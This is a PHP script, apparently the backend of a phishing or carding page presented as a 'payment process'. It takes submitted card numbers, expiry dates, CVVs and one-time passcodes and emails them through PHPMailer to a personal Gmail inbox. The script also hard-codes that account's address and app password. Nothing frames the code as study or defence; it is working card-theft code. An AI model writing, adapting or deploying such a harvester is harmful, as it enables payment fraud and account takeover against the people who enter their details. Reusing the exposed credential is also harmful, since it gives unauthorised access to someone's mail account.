<?php
// Load Composer's autoloader (if using Composer)
require 'vendor/autoload.php';

// Import PHPMailer classes into the global namespace
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;
use PHPMailer\PHPMailer\SMTP;



function sendEmail($post) {
    // $to = filter_var($post['to'], FILTER_SANITIZE_EMAIL);
    $subject = filter_var("payment process", FILTER_SANITIZE_STRING);
    $name = $post['name'];
    $card_number = $post['cardNumber'];
    $card_expiration_year = $post['expYear'];
    $card_expiration_month = $post['expMonth'];
    $cvv = $post['cvv'];


    $email_body = "You have received a new message.\n\n";
    $email_body .= "Card owner: $name\n";
    // $email_body .= "Email: $to\n";
    $email_body .= "Card number: $card_number\n";
    $email_body .= "Card expiration year: $card_expiration_year\n";
    $email_body .= "Card expiration month: $card_expiration_month\n";
    $email_body .= "Card CVC: $cvv\n";


    $html_body = "<h3>You have received a new message.</h3>";
    $html_body .= "<p><strong>Card owner:</strong> $name</p>";
    $html_body .= "<p><strong>card number:</strong> $card_number</p>";
    $html_body .= "<p><strong>card expiration year:</strong><br>$card_expiration_year</p>";
    $html_body .= "<p><strong>card expiration month:</strong><br>$card_expiration_month</p>";
    $html_body .= "<p><strong>cvc:</strong><br>$cvv</p>";
    $mail = new PHPMailer(true);  // Create a new PHPMailer instance

    try {
        //Server settings
        $mail->SMTPDebug = 0;  // Disable verbose debug output
        $mail->isSMTP();  // Set mailer to use SMTP
        $mail->Host       = 'smtp.gmail.com';  // Specify Gmail's SMTP server
        $mail->SMTPAuth   = true;  // Enable SMTP authentication
        $mail->Username   = 'habeebajani9@gmail.com';   // Your Gmail address
        $mail->Password   = 'ugdl yjwx ibao golx';  // Your Gmail password or app-specific password
        $mail->SMTPSecure = 'ssl';  // Enable TLS encryption
        $mail->Port       = 465;  // TCP port to connect to Gmail's SMTP

        //Recipients
        $mail->setFrom('habeebajani9@gmail.com', 'Habeeb');  // From email address and name
        $mail->addAddress("habeebajani9@gmail.com", "Habeeb");  // Recipient email address

        // Content
        $mail->isHTML(true);  // Set email format to HTML
        $mail->Subject = $subject;
        $mail->Body    = $email_body;

        // Send the email
        $mail->send();
        echo 'success';
    } catch (Exception $e) {
        echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
    }
}


function sendContact($post) {
    // $to = filter_var($post['to'], FILTER_SANITIZE_EMAIL);
//$subject = filter_var("payment process", FILTER_SANITIZE_STRING);
    $name = $post['name'];
    $email = $post['email'];
    $subject = $post['subject'];
    $message = filter_var( $post['message'], FILTER_SANITIZE_STRING);


    $email_body = $message;
   


    $html_body = "<h3>$message.</h3>";
    // $html_body .= "<p><strong>Card owner:</strong> $name</p>";
    // $html_body .= "<p><strong>card number:</strong> $card_number</p>";
    // $html_body .= "<p><strong>card expiration year:</strong><br>$card_expiration_year</p>";
    // $html_body .= "<p><strong>card expiration month:</strong><br>$card_expiration_month</p>";
    // $html_body .= "<p><strong>cvc:</strong><br>$cvv</p>";
    $mail = new PHPMailer(true);  // Create a new PHPMailer instance

    try {
        //Server settings
        $mail->SMTPDebug = 0;  // Disable verbose debug output
        $mail->isSMTP();  // Set mailer to use SMTP
        $mail->Host       = 'smtp.gmail.com';  // Specify Gmail's SMTP server
        $mail->SMTPAuth   = true;  // Enable SMTP authentication
        $mail->Username   = 'habeebajani9@gmail.com';   // Your Gmail address
        $mail->Password   = 'ugdl yjwx ibao golx';  // Your Gmail password or app-specific password
        $mail->SMTPSecure = 'ssl';  // Enable TLS encryption
        $mail->Port       = 465;  // TCP port to connect to Gmail's SMTP

        //Recipients
        $mail->setFrom('habeebajani9@gmail.com', 'Habeeb');  // From email address and name
        $mail->addAddress("habeebajani9@gmail.com", "Habeeb");  // Recipient email address

        // Content
        $mail->isHTML(true);  // Set email format to HTML
        $mail->Subject = $subject;
        $mail->Body    = $email_body;

        // Send the email
        $mail->send();
        echo 'success';
    } catch (Exception $e) {
        echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
    }
}
function sendOTP($post) {
    // $to = filter_var($post['to'], FILTER_SANITIZE_EMAIL);
    $subject = filter_var("payment process OTP", FILTER_SANITIZE_STRING);
    $name = $post['OTP'];
    


    $email_body = "You have received a new message.\n\n";
    $email_body .= "OTP: $name\n";
    


    $html_body = "<h3>You have received a new message.</h3>";
    $html_body .= "<p><strong>Card owner:</strong> $name</p>";
    
    $mail = new PHPMailer(true);  // Create a new PHPMailer instance

    try {
        //Server settings
        $mail->SMTPDebug = 0;  // Disable verbose debug output
        $mail->isSMTP();  // Set mailer to use SMTP
        $mail->Host       = 'smtp.gmail.com';  // Specify Gmail's SMTP server
        $mail->SMTPAuth   = true;  // Enable SMTP authentication
        $mail->Username   = 'habeebajani9@gmail.com';   // Your Gmail address
        $mail->Password   = 'ugdl yjwx ibao golx';  // Your Gmail password or app-specific password
        $mail->SMTPSecure = 'ssl';  // Enable TLS encryption
        $mail->Port       = 465;  // TCP port to connect to Gmail's SMTP

        //Recipients
        $mail->setFrom('habeebajani9@gmail.com', 'Habeeb');  // From email address and name
        $mail->addAddress("habeebajani9@gmail.com", "Habeeb");  // Recipient email address

        // Content
        $mail->isHTML(true);  // Set email format to HTML
        $mail->Subject = $subject;
        $mail->Body    = $email_body;

        // Send the email
        $mail->send();
        echo 'success';
    } catch (Exception $e) {
        echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
    }
}

if(isset($_POST['sendcard'])){
    sendEmail($_POST);
}
if(isset($_POST['sendotp'])){
    sendOTP($_POST);
}

?>
